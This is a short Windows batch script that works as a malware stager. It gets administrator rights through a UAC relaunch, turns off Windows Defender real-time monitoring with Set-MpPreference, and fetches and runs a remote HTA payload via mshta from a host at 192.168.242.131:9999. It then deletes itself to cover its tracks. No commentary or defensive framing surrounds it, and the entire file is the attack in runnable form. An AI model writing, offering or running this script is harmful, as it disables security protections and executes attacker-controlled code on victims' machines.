@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit
)
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
mshta http://192.168.242.131:9999/zza1x
del "%~f0"
exit
